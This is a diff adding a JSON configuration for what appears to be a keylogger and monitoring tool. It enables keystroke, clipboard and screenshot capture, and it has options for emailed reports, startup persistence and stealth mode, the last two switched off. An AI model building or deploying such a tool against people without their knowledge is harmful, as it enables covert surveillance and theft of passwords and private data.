@@ -1,0 +1,57 @@
+{
+  "keylogger": {
+    "enabled": true,
+    "log_file": "logs/keylog.txt",
+    "capture_special_keys": true,
+    "stop_key": "esc"
+  },
+  "advanced_logging": {
+    "enabled": true,
+    "log_format": "json",
+    "export_csv": true,
+    "session_tracking": true
+  },
+  "system_info": {
+    "enabled": true,
+    "capture_interval": 300,
+    "include_cpu": true,
+    "include_memory": true,
+    "include_disk": true,
+    "include_network": true,
+    "include_processes": false
+  },
+  "screenshots": {
+    "enabled": true,
+    "capture_type": "full",
+    "save_directory": "screenshots",
+    "periodic_capture": false,
+    "capture_interval": 600,
+    "image_format": "png",
+    "quality": 85
+  },
+  "clipboard": {
+    "enabled": true,
+    "log_file": "logs/clipboard.txt",
+    "check_interval": 1,
+    "export_format": "txt"
+  },
+  "email_alerts": {
+    "enabled": false,
+    "smtp_server": "smtp.gmail.com",
+    "smtp_port": 587,
+    "sender_email": "your_email@gmail.com",
+    "sender_password": "your_app_password",
+    "recipient_email": "recipient@example.com",
+    "send_periodic_reports": false,
+    "report_interval": 3600
+  },
+  "general": {
+    "debug_mode": true,
+    "log_directory": "logs",
+    "screenshot_directory": "screenshots",
+    "max_log_size_mb": 100,
+    "rotate_logs": true,
+    "run_on_startup": false,
+    "stealth_mode": false
+  }
+}
